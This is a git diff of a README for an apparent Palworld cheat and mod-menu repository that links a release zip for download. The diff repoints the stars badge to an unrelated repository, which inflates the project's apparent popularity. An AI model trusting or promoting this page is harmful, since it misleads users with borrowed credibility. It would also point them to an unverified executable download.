@@ -1,9 +1,9 @@
-# Palworld Cheat / Mod Menu (Upd. 15-08-26)
+# Palworld Cheat / Mod Menu (Upd: 15-08-26)
 
 [![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/yarnspearcrush/palworld-modmenu/releases/download/v1.1/Palworld-1.1.0.zip)
 [![GitHub release](https://img.shields.io/badge/Release-v1.1-blue?style=for-the-badge)](https://github.com/yarnspearcrush/palworld-modmenu/releases/download/v1.1/Palworld-1.1.0.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](https://opensource.org/licenses/MIT)
-[![Stars](https://img.shields.io/github/stars/yarnspearcrush/palworld-modmenu?style=for-the-badge&logo=github)](https://github.com/yarnspearcrush/palworld-modmenu/stargazers)
+[![Stars](https://img.shields.io/github/stars/marwan-at-work/mod?style=for-the-badge&logo=github)](https://github.com/marwan-at-work/mod/stargazers)
 
 
 A powerful hack tool for Palworld with clean in-game overlay
